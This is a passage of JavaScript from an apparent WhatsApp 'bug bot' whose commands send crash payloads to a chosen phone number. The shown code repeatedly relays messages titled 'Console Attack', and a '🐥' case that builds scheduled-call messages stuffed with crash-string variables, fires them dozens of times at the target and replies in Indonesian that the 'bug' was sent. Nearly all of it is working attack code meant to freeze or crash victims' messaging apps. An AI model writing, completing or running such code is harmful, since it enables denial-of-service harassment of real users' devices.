konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case '🐥' :  {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "3"
//jumlah = q.split(",")[1]
//↑pake ini klo jumlahnya mau dicustom 
konsol = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
